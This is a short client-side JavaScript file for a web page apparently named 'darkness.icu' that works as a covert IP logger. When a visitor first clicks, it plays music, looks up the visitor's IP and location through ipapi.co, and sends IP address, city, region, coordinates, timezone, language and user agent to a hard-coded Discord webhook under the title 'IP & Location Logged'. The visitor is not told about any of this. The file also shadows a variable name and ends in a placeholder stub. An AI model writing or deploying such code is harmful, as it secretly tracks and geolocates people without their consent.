const entry = document.getElementById("entry");
const payload = document.getElementById("payload");
const info = document.getElementById("info");
const music = document.getElementById("music");
const fog = document.getElementById("fog");

let started = false;

fog.onclick = (e) => {
  e.stopPropagation();
  window.location.href = "https://6fog.lol";
};

document.body.onclick = async () => {
  if (started) return;
  started = true;

  entry.style.display = "none";
  payload.classList.remove("hidden");
  music.play();

  // SEND IP/LOCATION TO DISCORD (NO CAMERA)
  const res = await fetch("https://ipapi.co/json/");
  const data = await res.json();
  
  // REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1499130770881646652/I-TGuJlGuxeC1N12ATsn0hmnnQ8V4NbrvPg2NkGkDZWUhYNaRmzYa-DTTdK-iLJ-txc4"; // ← CRITICAL: REPLACE THIS

  // SEND DATA TO DISCORD
  const payload = {
    content: "🔥 New visitor to darkness.icu",
    embeds: [{
      title: "IP & Location Logged",
      color: 0xff0000,
      fields: [
        { name: "IP Address", value: data.ip, inline: true },
        { name: "Country", value: data.country_name, inline: true },
        { name: "City", value: data.city, inline: true },
        { name: "Region", value: data.region, inline: true },
        { name: "Coordinates", value: `${data.latitude}, ${data.longitude}`, inline: true },
        { name: "Timezone", value: data.timezone, inline: true },
        { name: "Language", value: navigator.language, inline: true },
        { name: "User Agent", value: navigator.userAgent, inline: true }
      ],
      timestamp: new Date().toISOString()
    }]
  };

  await fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  // Show IP info on the site (as before)
  setInterval(() => {
    // ... [your existing setInterval code] ...
  }, 1000);
};
